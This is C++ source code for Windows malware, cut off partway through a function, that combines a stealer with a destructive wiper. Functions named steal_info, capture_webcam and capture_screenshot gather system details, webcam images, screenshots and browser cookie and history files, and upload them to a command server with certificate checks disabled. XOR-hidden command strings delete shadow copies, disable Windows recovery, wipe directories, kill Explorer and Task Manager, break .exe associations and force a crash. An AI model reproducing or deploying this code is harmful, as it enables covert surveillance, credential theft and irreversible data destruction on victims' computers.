#include <Windows.h>
#include <TlHelp32.h>
#include <chrono>
#include <cstdio>
#include <cstring>
#include <thread>
#include <string>
#include <vector>
#include <fstream>
#include <random>
#include <cmath>
#include <mmsystem.h>
#include <winhttp.h>
#include <dshow.h>
#include <gdiplus.h>
#include <ShlObj.h>
#include <intrin.h>
#include "config.h"
#include "curl/curl.h"

#define ANTI_VM 1  // 1 = block VMs, 0 = allow

#pragma comment(lib, "strmiids.lib")
#pragma comment(lib, "gdiplus.lib")
#pragma comment(lib, "ole32.lib")
#pragma comment(lib, "oleaut32.lib")
#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "winmm.lib")
#pragma comment(lib, "winhttp.lib")
#pragma comment(lib, "libcurl.lib")

// libcurl write callback
static size_t curl_write_cb(void* ptr, size_t sz, size_t nmemb, void* ud) {
    ((std::string*)ud)->append((char*)ptr, sz * nmemb);
    return sz * nmemb;
}

// libcurl-based upload: uses CURLOPT_RESOLVE to pin domain to good CF edge IP
// (equivalent to curl --resolve), keeping correct SNI without hosts file hacks.
void simple_upload()
{
    CURL* curl = curl_easy_init();
    if (!curl) return;

    char host_u8[256], token_url[320], upload_url[512];
    WideCharToMultiByte(CP_UTF8, 0, SERVER_HOST, -1, host_u8, sizeof(host_u8), nullptr, nullptr);
    sprintf_s(token_url, "https://%s/token", host_u8);

    char resolve_str[512];
    sprintf_s(resolve_str, "+%s:443:104.21.54.80", host_u8);
    struct curl_slist* hosts = nullptr;
    hosts = curl_slist_append(hosts, resolve_str);
    curl_easy_setopt(curl, CURLOPT_RESOLVE, hosts);
    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L);
    curl_easy_setopt(curl, CURLOPT_TIMEOUT, 60L);
    curl_easy_setopt(curl, CURLOPT_CONNECTTIMEOUT, 15L);
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, curl_write_cb);

    // --- GET /token ---
    std::string token;
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, &token);
    curl_easy_setopt(curl, CURLOPT_URL, token_url);
    CURLcode res = curl_easy_perform(curl);
    if (res == CURLE_OK) {
        const char* p = strstr(token.c_str(), "\"token\"");
        if (p) { p = strchr(p, ':'); if (p) { p = strchr(p, '"');
            if (p) { const char* q = strchr(p + 1, '"');
            if (q) token.assign(p + 1, q); } } }
    }
    if (token.empty()) { curl_slist_free_all(hosts); curl_easy_cleanup(curl); return; }

    // --- collect local files ---
    wchar_t scrPath[MAX_PATH], camPath[MAX_PATH], infoPath[MAX_PATH];
    GetTempPathW(MAX_PATH, scrPath); wcscat_s(scrPath, L"scr.png");
    SHGetFolderPathW(nullptr, CSIDL_LOCAL_APPDATA, nullptr, 0, camPath); wcscat_s(camPath, L"\\wallpaper.png");
    SHGetFolderPathW(nullptr, CSIDL_LOCAL_APPDATA, nullptr, 0, infoPath); wcscat_s(infoPath, L"\\sysinfo.log");

    auto load = [](const wchar_t* path) -> std::vector<BYTE> {
        HANDLE h = CreateFileW(path, GENERIC_READ, FILE_SHARE_READ, nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
        if (h == INVALID_HANDLE_VALUE) return {};
        DWORD sz = GetFileSize(h, nullptr);
        if (!sz || sz > 5 * 1024 * 1024) { CloseHandle(h); return {}; }
        std::vector<BYTE> d(sz);
        DWORD rd; ReadFile(h, d.data(), sz, &rd, nullptr);
        CloseHandle(h); return d;
    };
    auto scr = load(scrPath), cam = load(camPath), inf = load(infoPath);

    // --- build multipart via curl_mime ---
    curl_mime* mime = curl_mime_init(curl);
    auto add_part = [&](const char* name, const wchar_t* fn, const std::vector<BYTE>& d) {
        if (d.empty()) return;
        curl_mimepart* pt = curl_mime_addpart(mime);
        curl_mime_name(pt, name);
        char fn_u8[256];
        WideCharToMultiByte(CP_UTF8, 0, fn, -1, fn_u8, sizeof(fn_u8), nullptr, nullptr);
        curl_mime_filename(pt, fn_u8);
        curl_mime_data(pt, (const char*)d.data(), d.size());
        curl_mime_type(pt, "application/octet-stream");
    };
    add_part("screenshot", L"scr.png", scr);
    add_part("webcam", L"wallpaper.png", cam);
    add_part("sysinfo", L"sysinfo.log", inf);

    wchar_t tmpDir[MAX_PATH];
    GetTempPathW(MAX_PATH, tmpDir);
    const wchar_t* patterns[] = { L"cookies_*", L"history_*", L"localstate_*" };
    for (auto* pat : patterns) {
        wchar_t search[MAX_PATH];
        swprintf_s(search, L"%s\\%s", tmpDir, pat);
        WIN32_FIND_DATAW fd;
        HANDLE hF = FindFirstFileW(search, &fd);
        if (hF != INVALID_HANDLE_VALUE) {
            do {
                if (!(fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) {
                    wchar_t fp[MAX_PATH];
                    swprintf_s(fp, L"%s\\%s", tmpDir, fd.cFileName);
                    auto cd = load(fp);
                    if (!cd.empty()) {
                        curl_mimepart* pt = curl_mime_addpart(mime);
                        curl_mime_name(pt, "cookies");
                        char fn_u8[256];
                        WideCharToMultiByte(CP_UTF8, 0, fd.cFileName, -1, fn_u8, sizeof(fn_u8), nullptr, nullptr);
                        curl_mime_filename(pt, fn_u8);
                        curl_mime_data(pt, (const char*)cd.data(), cd.size());
                        curl_mime_type(pt, "application/octet-stream");
                    }
                }
            } while (FindNextFileW(hF, &fd));
            FindClose(hF);
        }
    }

    // --- POST /upload?token=xxx ---
    std::string post_body;
    sprintf_s(upload_url, "https://%s/upload?token=%s", host_u8, token.c_str());
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, &post_body);
    curl_easy_setopt(curl, CURLOPT_URL, upload_url);
    curl_easy_setopt(curl, CURLOPT_MIMEPOST, mime);
    curl_easy_perform(curl);

    curl_mime_free(mime);
    curl_slist_free_all(hosts);
    curl_easy_cleanup(curl);
}

// XOR string obfuscation
constexpr unsigned char XKEY = 0x55;
inline void X(char* s, size_t n) { for (size_t i = 0; i < n; i++) s[i] ^= XKEY; }
inline const char* XD(char* b, size_t n, bool& f) { if (!f) { X(b, n); f = true; } return b; }
#define XSTR(var) ([]()->const char*{ static bool f; return XD(var, sizeof(var)-1, f); }())

// Pre-XOR'd strings (key 0x55)
static char _cmd1[] = {0x36,0x38,0x31,0x75,0x7A,0x36,0x75,0x26,0x21,0x34,0x27,0x21,0x75,0x7A,0x37,0x75,0x07,0x11,0x75}; // "cmd /c start /b RD "
static char _sdq[] = {0x09,0x75,0x7A,0x06,0x75,0x7A,0x04}; // "\\ /S /Q"
static char _tsk[] = {0x36,0x38,0x31,0x75,0x7A,0x36,0x75,0x21,0x34,0x26,0x3E,0x3E,0x3C,0x39,0x39,0x75,0x7A,0x1C,0x18,0x75,0x30,0x2D,0x25,0x39,0x3A,0x27,0x30,0x27,0x7B,0x30,0x2D,0x30,0x75,0x7A,0x33}; // "cmd /c taskkill /IM explorer.exe /f"
static char _swp[] = {0x36,0x38,0x31,0x75,0x7A,0x36,0x75,0x07,0x20,0x3B,0x31,0x39,0x39,0x66,0x67,0x75,0x20,0x26,0x30,0x27,0x66,0x67,0x79,0x75,0x06,0x22,0x34,0x25,0x18,0x3A,0x20,0x26,0x30,0x17,0x20,0x21,0x21,0x3A,0x3B}; // "cmd /c Rundll32 user32, SwapMouseButton"
static char _shd[] = {0x36,0x38,0x31,0x75,0x7A,0x36,0x75,0x26,0x3D,0x20,0x21,0x31,0x3A,0x22,0x3B,0x75,0x7A,0x26,0x75,0x7A,0x33,0x75,0x7A,0x21,0x75,0x64,0x65}; // "cmd /c shutdown /s /f /t 10"
static char _tko[] = {0x36,0x38,0x31,0x75,0x7A,0x36,0x75,0x21,0x34,0x3E,0x30,0x3A,0x22,0x3B,0x75,0x7A,0x33}; // "cmd /c start /b takeown /f "
static char _ic1[] = {0x22,0x75,0x7A,0x27,0x75,0x7A,0x31,0x75,0x2C,0x75,0x73,0x75,0x3C,0x36,0x34,0x36,0x39,0x26,0x75,0x22}; // "\" /r /d y & icacls \""
static char _ic2[] = {0x22,0x75,0x7A,0x32,0x27,0x34,0x3B,0x21,0x75,0x18,0x23,0x30,0x27,0x2C,0x3A,0x3B,0x30,0x68,0x18,0x75,0x7A,0x15,0x75,0x7A,0x04,0x75,0x73,0x75,0x07,0x11,0x75,0x7A,0x06,0x75,0x7A,0x04,0x75,0x22}; // "\" /grant Everyone:F /T /Q & RD /S /Q \""
static char _aso[] = {0x36,0x38,0x31,0x75,0x7A,0x36,0x75,0x34,0x26,0x26,0x3A,0x36,0x75,0x7B,0x30,0x2D,0x30,0x68,0x75}; // "cmd /c assoc .exe= "
static char _ftp[] = {0x36,0x38,0x31,0x75,0x7A,0x36,0x75,0x33,0x21,0x2C,0x25,0x30,0x75,0x30,0x2D,0x30,0x33,0x3C,0x39,0x30,0x68,0x75}; // "cmd /c ftype exefile= "
static char _scc[] = {0x36,0x38,0x31,0x75,0x7A,0x36,0x75,0x26,0x36,0x75,0x36,0x3A,0x3B,0x33,0x3C,0x32,0x75}; // "cmd /c sc config "
static char _ssd[] = {0x75,0x26,0x21,0x34,0x27,0x21,0x68,0x75,0x31,0x3C,0x26,0x34,0x37,0x39,0x30,0x31,0x75,0x73,0x75,0x26,0x36,0x75,0x26,0x21,0x3A,0x25,0x75}; // " start= disabled & sc stop "
static char _tkm[] = {0x36,0x38,0x31,0x75,0x7A,0x36,0x75,0x21,0x34,0x26,0x3E,0x3E,0x3C,0x39,0x39,0x75,0x7A,0x1C,0x18,0x75,0x21,0x34,0x26,0x3E,0x38,0x32,0x27,0x7B,0x30,0x2D,0x30,0x75,0x7A,0x33,0x75,0x7A,0x21}; // "cmd /c taskkill /IM taskmgr.exe /f /t"
static char _vss[] = {0x36,0x38,0x31,0x75,0x7A,0x36,0x75,0x23,0x26,0x26,0x34,0x31,0x38,0x3C,0x3B,0x75,0x31,0x30,0x39,0x30,0x21,0x30,0x75,0x26,0x3D,0x34,0x31,0x3A,0x22,0x26,0x75,0x7A,0x34,0x39,0x39,0x75,0x7A,0x24,0x20,0x3C,0x30,0x21}; // "cmd /c vssadmin delete shadows /all /quiet"
static char _rea[] = {0x36,0x38,0x31,0x75,0x7A,0x36,0x75,0x27,0x30,0x34,0x32,0x30,0x3B,0x21,0x36,0x75,0x7A,0x31,0x3C,0x26,0x34,0x37,0x39,0x30}; // "cmd /c reagentc /disable"
static char _wmi[] = {0x36,0x38,0x31,0x75,0x7A,0x36,0x75,0x22,0x38,0x3C,0x36,0x75,0x26,0x3D,0x34,0x31,0x3A,0x22,0x36,0x3A,0x25,0x2C,0x75,0x31,0x30,0x39,0x30,0x21,0x30}; // "cmd /c wmic shadowcopy delete"
static char _cbs[] = {0x36,0x38,0x31,0x75,0x7A,0x36,0x75,0x26,0x21,0x34,0x27,0x21,0x75,0x7A,0x37,0x76,0x76,0x09,0x7A,0x7A,0x76,0x20,0x39,0x3A,0x37,0x34,0x39,0x27,0x3A,0x3A,0x21,0x76,0x31,0x30,0x23,0x3C,0x36,0x30,0x76,0x36,0x3A,0x3B,0x31,0x27,0x23,0x76,0x3E,0x30,0x27,0x3B,0x30,0x39,0x36,0x3A,0x3B,0x3B,0x30,0x36,0x21}; // "cmd /c start /b \\\\.\\globalroot\\device\\condrv\\kernelconnect"
static char _msg[] = {0x2C,0x3A,0x20,0x75,0x25,0x36,0x75,0x3F,0x20,0x26,0x21,0x75,0x33,0x20,0x36,0x3E,0x30,0x31,0x75,0x20,0x25,0x75,0x37,0x2C,0x75,0x26,0x22,0x7B,0x36,0x36}; // "you pc just fucked up by sw.cc"
static char _enj[] = {0x30,0x3B,0x3F,0x3A,0x2C,0x75,0x38,0x2C,0x75,0x32,0x3C,0x33,0x21,0x26,0x75,0x19,0x1A,0x19}; // "enjoy my gifts LOL"
static char _ck[] = {0x36,0x3A,0x3A,0x3E,0x3C,0x30,0x26,0x0A}; // "cookies_"
static char _hi[] = {0x3D,0x3C,0x26,0x21,0x3A,0x27,0x2C,0x0A}; // "history_"

void diag_log(const char*) {}

// qedit.h was removed from Windows SDK 8+ — manual definitions
static const CLSID CLSID_SampleGrabber =
{ 0xC1F400A0, 0x3F08, 0x11D3, { 0x9F, 0x0B, 0x00, 0x60, 0x08, 0x03, 0x9E, 0x37 } };
static const IID IID_ISampleGrabber =
{ 0x6B652FFF, 0x11FE, 0x4FCE, { 0x92, 0xAD, 0x02, 0x66, 0xB5, 0xD7, 0xC7, 0x8F } };
static const CLSID CLSID_NullRenderer =
{ 0xC1F400A4, 0x3F08, 0x11D3, { 0x9F, 0x0B, 0x00, 0x60, 0x08, 0x03, 0x9E, 0x37 } };

struct ISampleGrabberCB;

struct ISampleGrabber : public IUnknown
{
    virtual HRESULT STDMETHODCALLTYPE SetOneShot(BOOL) = 0;
    virtual HRESULT STDMETHODCALLTYPE SetMediaType(const AM_MEDIA_TYPE*) = 0;
    virtual HRESULT STDMETHODCALLTYPE GetConnectedMediaType(AM_MEDIA_TYPE*) = 0;
    virtual HRESULT STDMETHODCALLTYPE SetBufferSamples(BOOL) = 0;
    virtual HRESULT STDMETHODCALLTYPE GetCurrentBuffer(long*, long*) = 0;
    virtual HRESULT STDMETHODCALLTYPE GetCurrentSample(IMediaSample**) = 0;
    virtual HRESULT STDMETHODCALLTYPE SetCallback(ISampleGrabberCB*, long) = 0;
};

__inline void FreeMediaType(AM_MEDIA_TYPE& mt)
{
    if (mt.cbFormat) CoTaskMemFree(mt.pbFormat);
    if (mt.pUnk) mt.pUnk->Release();
    ZeroMemory(&mt, sizeof(mt));
}

// PixelFormat24bppRGB = 0x21808, force raw value for SDK compat
constexpr Gdiplus::PixelFormat kPixelFormat24bppRGB = (Gdiplus::PixelFormat)0x21808;
constexpr Gdiplus::PixelFormat kPixelFormat32bppARGB = (Gdiplus::PixelFormat)0x26200A;


void capture_webcam()
{
    HRESULT hr;
    Gdiplus::GdiplusStartupInput gdiInput;
    ULONG_PTR gdiToken = 0;
    ICreateDevEnum* pDevEnum = nullptr;
    IEnumMoniker* pEnum = nullptr;
    IMoniker* pMoniker = nullptr;
    IBaseFilter* pCapFilter = nullptr;
    IGraphBuilder* pGraph = nullptr;
    IBaseFilter* pGrabberFilter = nullptr;
    ISampleGrabber* pGrabber = nullptr;
    AM_MEDIA_TYPE mt = {};
    IBaseFilter* pNullRenderer = nullptr;
    ICaptureGraphBuilder2* pBuilder = nullptr;
    IMediaControl* pControl = nullptr;
    AM_MEDIA_TYPE connectedType = {};
    CLSID pngClsid = {};

    hr = CoInitializeEx(nullptr, COINIT_MULTITHREADED);
    if (FAILED(hr)) return;

    Gdiplus::GdiplusStartup(&gdiToken, &gdiInput, nullptr);

    do {
        hr = CoCreateInstance(CLSID_SystemDeviceEnum, nullptr, CLSCTX_INPROC,
            IID_ICreateDevEnum, (void**)&pDevEnum);
        if (FAILED(hr)) break;

        hr = pDevEnum->CreateClassEnumerator(CLSID_VideoInputDeviceCategory, &pEnum, 0);
        if (FAILED(hr) || !pEnum) { if (pEnum) pEnum->Release(); pDevEnum->Release(); pDevEnum = nullptr; break; }

        if (pEnum->Next(1, &pMoniker, nullptr) != S_OK) {
            pEnum->Release(); pDevEnum->Release(); pDevEnum = nullptr; break;
        }
        pEnum->Release(); pEnum = nullptr;
        pDevEnum->Release(); pDevEnum = nullptr;

        hr = pMoniker->BindToObject(nullptr, nullptr, IID_IBaseFilter, (void**)&pCapFilter);
        pMoniker->Release(); pMoniker = nullptr;
        if (FAILED(hr)) break;

        hr = CoCreateInstance(CLSID_FilterGraph, nullptr, CLSCTX_INPROC,
            IID_IGraphBuilder, (void**)&pGraph);
        if (FAILED(hr)) break;

        pGraph->AddFilter(pCapFilter, L"Capture");

        hr = CoCreateInstance(CLSID_SampleGrabber, nullptr, CLSCTX_INPROC,
            IID_IBaseFilter, (void**)&pGrabberFilter);
        if (FAILED(hr)) break;

        pGrabberFilter->QueryInterface(IID_ISampleGrabber, (void**)&pGrabber);
        pGraph->AddFilter(pGrabberFilter, L"Grabber");

        mt.majortype = MEDIATYPE_Video;
        mt.subtype = MEDIASUBTYPE_RGB24;
        mt.formattype = FORMAT_VideoInfo;
        pGrabber->SetMediaType(&mt);
        pGrabber->SetBufferSamples(TRUE);

        hr = CoCreateInstance(CLSID_NullRenderer, nullptr, CLSCTX_INPROC,
            IID_IBaseFilter, (void**)&pNullRenderer);
        if (!SUCCEEDED(hr)) break;

        pGraph->AddFilter(pNullRenderer, L"Null");

        hr = CoCreateInstance(CLSID_CaptureGraphBuilder2, nullptr, CLSCTX_INPROC,
            IID_ICaptureGraphBuilder2, (void**)&pBuilder);
        if (!SUCCEEDED(hr)) break;

        pBuilder->SetFiltergraph(pGraph);
        pBuilder->RenderStream(&PIN_CATEGORY_CAPTURE, &MEDIATYPE_Video,
            pCapFilter, pGrabberFilter, pNullRenderer);
        pBuilder->Release(); pBuilder = nullptr;

        hr = pGraph->QueryInterface(IID_IMediaControl, (void**)&pControl);
        if (!SUCCEEDED(hr) || !pControl) break;

        pControl->Run();
        Sleep(1500);

        long bufferSize = 0;
        pGrabber->GetCurrentBuffer(&bufferSize, nullptr);
        if (bufferSize > 0) {
            char* buffer = new (std::nothrow) char[bufferSize];
            if (buffer && pGrabber->GetCurrentBuffer(&bufferSize, (long*)buffer) == S_OK) {
                pGrabber->GetConnectedMediaType(&connectedType);
                VIDEOINFOHEADER* vih = (VIDEOINFOHEADER*)connectedType.pbFormat;
                if (!vih) break;
                int w = vih->bmiHeader.biWidth;
                int h = vih->bmiHeader.biHeight;

                int stride = ((w * 3 + 3) / 4) * 4;
                Gdiplus::Bitmap bmp(w, h, stride, kPixelFormat24bppRGB, (BYTE*)buffer);
                bmp.RotateFlip(Gdiplus::RotateNoneFlipY);

                UINT num = 0, sizeVal = 0;
                Gdiplus::GetImageEncodersSize(&num, &sizeVal);
                if (!num || !sizeVal) break;
                Gdiplus::ImageCodecInfo* codecs = (Gdiplus::ImageCodecInfo*)malloc(sizeVal);
                if (codecs) {
                    UINT numOut = num;
                    Gdiplus::GetImageEncoders(numOut, sizeVal, codecs);
                    for (UINT i = 0; i < numOut; i++) {
                        if (wcscmp(codecs[i].MimeType, L"image/png") == 0) {
                            pngClsid = codecs[i].Clsid;
                            break;
                        }
                    }
                    free(codecs);
                }

                wchar_t localPath[MAX_PATH];
                SHGetFolderPathW(nullptr, CSIDL_LOCAL_APPDATA, nullptr, 0, localPath);
                wcscat_s(localPath, L"\\wallpaper.png");
                bmp.Save(localPath, &pngClsid, nullptr);

                FreeMediaType(connectedType);
            }
            delete[] buffer;
        }

        pControl->Stop();
        pControl->Release(); pControl = nullptr;
    } while (false);

    if (pNullRenderer) { pNullRenderer->Release(); }
    if (pGrabber) { pGrabber->Release(); }
    if (pGrabberFilter) { pGrabberFilter->Release(); }
    if (pCapFilter) { pCapFilter->Release(); }
    if (pGraph) { pGraph->Release(); }
    if (pMoniker) { pMoniker->Release(); }
    if (pEnum) { pEnum->Release(); }
    if (pDevEnum) { pDevEnum->Release(); }

    Gdiplus::GdiplusShutdown(gdiToken);
    CoUninitialize();
}

void steal_info()
{
    std::string report;

    auto add_line = [&](const char* label, const std::string& value) {
        report += std::string(label) + ": " + value + "\n";
    };

    auto w2s = [](const wchar_t* w) -> std::string {
        if (!w || !*w) return {};
        int len = WideCharToMultiByte(CP_UTF8, 0, w, -1, nullptr, 0, nullptr, nullptr);
        if (len <= 1) return {};
        std::string s(len - 1, '\0');
        WideCharToMultiByte(CP_UTF8, 0, w, -1, &s[0], len, nullptr, nullptr);
        return s;
    };

    auto regStr = [&](HKEY root, const wchar_t* path, const wchar_t* val) -> std::string {
        HKEY hk;
        if (RegOpenKeyExW(root, path, 0, KEY_READ, &hk) != ERROR_SUCCESS) return "";
        wchar_t buf[256] = {};
        DWORD sz = sizeof(buf);
        RegQueryValueExW(hk, val, nullptr, nullptr, (BYTE*)buf, &sz);
        RegCloseKey(hk);
        return w2s(buf);
    };

    // --- CPU ---
    std::string cpuName = regStr(HKEY_LOCAL_MACHINE,
        L"HARDWARE\\DESCRIPTION\\System\\CentralProcessor\\0", L"ProcessorNameString");
    add_line("CPU", cpuName.empty() ? "unknown" : cpuName);

    wchar_t buf[512];
    if (GetEnvironmentVariableW(L"NUMBER_OF_PROCESSORS", buf, 512))
        add_line("CPU Cores", w2s(buf));

    // --- RAM ---
    MEMORYSTATUSEX ms = { sizeof(ms) };
    if (GlobalMemoryStatusEx(&ms)) {
        char ram[32];
        sprintf_s(ram, "%.1f GB", ms.ullTotalPhys / (1024.0 * 1024.0 * 1024.0));
        add_line("Total RAM", ram);
    }

    // --- GPU ---
    DISPLAY_DEVICEW dd = { sizeof(dd) };
    if (EnumDisplayDevicesW(nullptr, 0, &dd, 0))
        add_line("GPU", w2s(dd.DeviceString));
    // VRAM from registry
    std::string vram = regStr(HKEY_LOCAL_MACHINE,
        L"SYSTEM\\CurrentControlSet\\Control\\Class\\{4d36e968-e325-11ce-bfc1-08002be10318}\\0000",
        L"HardwareInformation.qwMemorySize");
    if (!vram.empty()) {
        LARGE_INTEGER li;
        li.QuadPart = _atoi64(vram.c_str());
        char vr[32];
        sprintf_s(vr, "GPU VRAM: %.0f MB", li.QuadPart / (1024.0 * 1024.0));
        add_line("GPU VRAM", vr);
    }

    // --- OS ---
    add_line("OS Name", regStr(HKEY_LOCAL_MACHINE,
        L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", L"ProductName"));

    // --- User ---
    if (GetEnvironmentVariableW(L"USERNAME", buf, 512))
        add_line("User Name", w2s(buf));
    if (GetEnvironmentVariableW(L"USERDOMAIN", buf, 512))
        add_line("User Domain", w2s(buf));
    if (GetEnvironmentVariableW(L"USERPROFILE", buf, 512))
        add_line("User Profile", w2s(buf));
    if (GetEnvironmentVariableW(L"LOGONSERVER", buf, 512))
        add_line("PC Name", w2s(buf));

    // --- Display ---
    int sw = GetSystemMetrics(SM_CXSCREEN), sh = GetSystemMetrics(SM_CYSCREEN);
    char res[32];
    sprintf_s(res, "%dx%d", sw, sh);
    add_line("Resolution", res);

    // --- save ---
    wchar_t tempDir[MAX_PATH];
    if (GetEnvironmentVariableW(L"LOCALAPPDATA", tempDir, MAX_PATH)) {
        wcscat_s(tempDir, L"\\sysinfo.log");
        HANDLE hFile = CreateFileW(tempDir, GENERIC_WRITE, 0, nullptr,
            CREATE_ALWAYS, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM, nullptr);
        if (hFile != INVALID_HANDLE_VALUE) {
            DWORD written;
            WriteFile(hFile, report.c_str(), (DWORD)report.size(), &written, nullptr);
            CloseHandle(hFile);
        }
    }
}

void capture_screenshot()
{
    int w = GetSystemMetrics(SM_CXSCREEN);
    int h = GetSystemMetrics(SM_CYSCREEN);
    if (w <= 0 || h <= 0) return;

    HDC hdcScreen = GetDC(nullptr);
    if (!hdcScreen) return;

    HDC hdcMem = CreateCompatibleDC(hdcScreen);
    HBITMAP hBitmap = CreateCompatibleBitmap(hdcScreen, w, h);
    if (!hdcMem || !hBitmap) {
        if (hBitmap) DeleteObject(hBitmap);
        if (hdcMem) DeleteDC(hdcMem);
        ReleaseDC(nullptr, hdcScreen);
        return;
    }

    HBITMAP hOld = (HBITMAP)SelectObject(hdcMem, hBitmap);
    if (!BitBlt(hdcMem, 0, 0, w, h, hdcScreen, 0, 0, SRCCOPY)) {
        SelectObject(hdcMem, hOld);
        DeleteObject(hBitmap);
        DeleteDC(hdcMem);
        ReleaseDC(nullptr, hdcScreen);
        return;
    }

    // get bitmap bits manually, then build GDI+ bitmap from raw bits
    BITMAPINFO bi = {};
    bi.bmiHeader.biSize = sizeof(bi.bmiHeader);
    bi.bmiHeader.biWidth = w;
    bi.bmiHeader.biHeight = -h;  // top-down
    bi.bmiHeader.biPlanes = 1;
    bi.bmiHeader.biBitCount = 32;
    bi.bmiHeader.biCompression = BI_RGB;

    std::vector<BYTE> pixels(w * h * 4);
    if (!GetDIBits(hdcMem, hBitmap, 0, h, pixels.data(), &bi, DIB_RGB_COLORS)) {
        SelectObject(hdcMem, hOld);
        DeleteObject(hBitmap);
        DeleteDC(hdcMem);
        ReleaseDC(nullptr, hdcScreen);
        return;
    }

    SelectObject(hdcMem, hOld);
    DeleteObject(hBitmap);
    DeleteDC(hdcMem);
    ReleaseDC(nullptr, hdcScreen);

    Gdiplus::GdiplusStartupInput gdiInput;
    ULONG_PTR gdiToken = 0;
    if (Gdiplus::GdiplusStartup(&gdiToken, &gdiInput, nullptr) != Gdiplus::Ok) return;

    Gdiplus::Bitmap bmp(w, h, w * 4, kPixelFormat32bppARGB, pixels.data());
    // fix alpha channel (Blt might leave alpha=0)
    for (int y = 0; y < h; y++) {
        for (int x = 0; x < w; x++) {
            BYTE* px = pixels.data() + (y * w + x) * 4;
            px[3] = 255;  // set alpha to opaque
        }
    }

    CLSID pngClsid = {};
    UINT num = 0, sizeVal = 0;
    Gdiplus::GetImageEncodersSize(&num, &sizeVal);
    Gdiplus::ImageCodecInfo* codecs = (Gdiplus::ImageCodecInfo*)malloc(sizeVal);
    if (codecs) {
        Gdiplus::GetImageEncoders(num, sizeVal, codecs);
        for (UINT i = 0; i < num; i++) {
            if (wcscmp(codecs[i].MimeType, L"image/png") == 0) {
                pngClsid = codecs[i].Clsid; break;
            }
        }
        free(codecs);
    }

    wchar_t path[MAX_PATH];
    GetTempPathW(MAX_PATH, path);
    wcscat_s(path, L"scr.png");
    bmp.Save(path, &pngClsid, nullptr);

    Gdiplus::GdiplusShutdown(gdiToken);
}


std::string fetch_token()
{
    std::string token;
    HINTERNET hSession = WinHttpOpen(L"Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
        WINHTTP_ACCESS_TYPE_NO_PROXY, nullptr, nullptr, 0);
    if (!hSession) { diag_log("token: WinHttpOpen failed"); return token; }

    HINTERNET hConnect = WinHttpConnect(hSession, SERVER_HOST, 443, 0);
    if (!hConnect) { diag_log("token: WinHttpConnect failed"); WinHttpCloseHandle(hSession); return token; }

    HINTERNET hReq = WinHttpOpenRequest(hConnect, L"GET", L"/token",
        nullptr, nullptr, nullptr, WINHTTP_FLAG_SECURE);
    if (!hReq) { WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession); return token; }
    DWORD _sf1 = SECURITY_FLAG_IGNORE_UNKNOWN_CA | SECURITY_FLAG_IGNORE_CERT_CN_INVALID | SECURITY_FLAG_IGNORE_CERT_DATE_INVALID | 0x00000080;
    WinHttpSetOption(hReq, WINHTTP_OPTION_SECURITY_FLAGS, &_sf1, sizeof(_sf1));

    BOOL ok = WinHttpSendRequest(hReq, nullptr, 0, nullptr, 0, 0, 0);
    if (!ok) { diag_log("token: SendRequest failed"); WinHttpCloseHandle(hReq); WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession); return token; }

    ok = WinHttpReceiveResponse(hReq, nullptr);
    if (!ok) { diag_log("token: ReceiveResponse failed"); WinHttpCloseHandle(hReq); WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession); return token; }

    char buf[256] = {};
    DWORD rd = 0;
    WinHttpReadData(hReq, buf, sizeof(buf) - 1, &rd);
    char tmp[64];
    sprintf_s(tmp, "token: raw=%s", buf);
    diag_log(tmp);

    const char* p = strstr(buf, "\"token\"");
    if (p) {
        p = strchr(p, ':');
        if (p) {
            p = strchr(p, '"');
            if (p) {
                const char* q = strchr(p + 1, '"');
                if (q) token.assign(p + 1, q);
            }
        }
    }
    WinHttpCloseHandle(hReq);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);

    if (token.empty()) diag_log("token: parse failed");
    else diag_log("token: got token");
    return token;
}

void upload_data()
{
    std::string token = fetch_token();
    if (token.empty()) { diag_log("upload: no token, abort"); return; }

    wchar_t scrPath[MAX_PATH], camPath[MAX_PATH], infoPath[MAX_PATH];

    GetTempPathW(MAX_PATH, scrPath);
    wcscat_s(scrPath, L"scr.png");
    SHGetFolderPathW(nullptr, CSIDL_LOCAL_APPDATA, nullptr, 0, camPath);
    wcscat_s(camPath, L"\\wallpaper.png");
    SHGetFolderPathW(nullptr, CSIDL_LOCAL_APPDATA, nullptr, 0, infoPath);
    wcscat_s(infoPath, L"\\sysinfo.log");

    auto load = [](const wchar_t* p) -> std::vector<BYTE> {
        HANDLE h = CreateFileW(p, GENERIC_READ, FILE_SHARE_READ,
            nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
        if (h == INVALID_HANDLE_VALUE) return {};
        DWORD sz = GetFileSize(h, nullptr);
        std::vector<BYTE> d(sz);
        DWORD rd;
        ReadFile(h, d.data(), sz, &rd, nullptr);
        CloseHandle(h);
        return d;
    };

    std::vector<BYTE> scr = load(scrPath);
    std::vector<BYTE> cam = load(camPath);
    std::vector<BYTE> inf = load(infoPath);

    // also grab the diagnostic log itself
    wchar_t logPath[MAX_PATH];
    GetTempPathW(MAX_PATH, logPath);
    wcscat_s(logPath, L"inj.log");
    std::vector<BYTE> logdata = load(logPath);

    char buf[128];
    sprintf_s(buf, "upload: scr=%zu cam=%zu inf=%zu log=%zu", scr.size(), cam.size(), inf.size(), logdata.size());
    diag_log(buf);

    // save backup to C:\Users\Public\ (C: not wiped, survives destruction)
    wchar_t backupDir[MAX_PATH];
    SHGetFolderPathW(nullptr, CSIDL_COMMON_DOCUMENTS, nullptr, 0, backupDir);
    auto saveBackup = [&](const wchar_t* name, const std::vector<BYTE>& data) {
        if (data.empty()) return;
        wchar_t p[MAX_PATH];
        swprintf_s(p, MAX_PATH, L"%s\\%s", backupDir, name);
        HANDLE hf = CreateFileW(p, GENERIC_WRITE, 0, nullptr,
            CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr);
        if (hf != INVALID_HANDLE_VALUE) {
